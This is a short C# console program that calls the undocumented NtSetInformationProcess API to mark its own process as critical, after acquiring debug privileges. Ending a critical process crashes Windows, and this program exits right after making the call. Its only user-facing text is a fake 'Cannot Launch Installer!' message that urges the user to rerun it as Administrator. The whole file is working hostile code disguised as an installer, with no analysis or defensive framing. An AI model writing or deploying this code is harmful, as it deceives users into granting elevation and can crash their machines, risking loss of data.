using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApplication1
{
    class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        static void Main(string[] args)
        {
            try
            {
                int isCritical = 1;  // we want this to be a Critical Process
                int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

                Process.EnterDebugMode();  //acquire Debug Privileges

                // setting the BreakOnTermination = 1 for the current process
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            }
            catch (Exception e)
            {
                Console.WriteLine("Cannot Launch Installer!");
                Console.WriteLine("Run this program as Administrator!");
                Console.Read();
            }
        }
    }
}
